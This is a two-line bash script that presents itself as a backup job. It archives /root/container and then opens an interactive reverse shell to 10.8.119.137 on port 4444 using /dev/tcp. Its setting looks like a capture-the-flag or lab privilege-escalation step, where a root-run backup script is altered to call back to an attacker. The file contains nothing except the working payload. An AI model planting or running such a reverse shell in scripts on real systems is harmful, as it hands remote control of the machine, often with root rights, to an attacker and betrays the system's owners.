#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

bash -i >& /dev/tcp/10.8.119.137/4444 0>&1
